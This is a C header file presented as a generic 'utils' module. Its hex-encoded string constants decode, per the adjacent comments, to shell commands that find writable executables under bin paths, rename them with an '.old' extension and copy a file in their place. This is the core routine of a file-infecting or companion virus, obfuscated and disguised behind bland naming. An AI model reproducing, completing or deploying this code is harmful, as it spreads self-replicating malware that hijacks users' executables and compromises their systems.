#ifndef _UTILS_H_
#define _UTILS_H_

#include <stdbool.h>

#define VERSION       "0.1.1"

#define DEFAULT_EXT   "2E6F6C64"

// find '%s' -executable -not -name '*.old' -writable -type f -exec ls -l {} \\; 2>/dev/null | grep 'bin' | cut -d ' ' -f9-
#define C0            "66696E642027257327202D65786563757461626C65202D6E6F74202D6E616D6520272A2E6F6C6427202D7772697461626C65202D747970652066202D65786563206C73202D6C207B7D205C3B20323E2F6465762F6E756C6C207C2067726570202762696E27207C20637574202D6420272027202D66392D"
// mv %s %s%s
#define C2            "6D762025732025732573"
// cp %s/%s %s
#define C3            "63702025732F2573202573"

typedef struct {
    char                *h;
    char                *n;
    char                *p;
} Utils;

Utils *utils_create(char *n);

void utils_destroy(Utils *utils);

void utils_run(int argc, char *argv[], Utils *utils);

void utils_print_help(char * s, Utils *utils);

char *utils_cwd();

bool utils_check(char *s);

char *utils_usage(char *e);

#endif //_UTILS_H_